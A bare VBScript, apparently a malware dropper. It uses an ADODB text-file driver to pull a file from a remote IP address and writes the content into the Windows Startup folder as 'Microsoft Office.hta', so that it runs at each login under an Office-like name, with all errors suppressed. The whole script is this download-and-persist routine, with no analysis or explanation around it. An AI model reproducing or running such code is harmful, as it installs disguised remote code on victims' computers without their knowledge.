on error resume next
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://205.209.188.30;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from f00bar393.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from f00bar393.txt", conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
rs.close
conn.close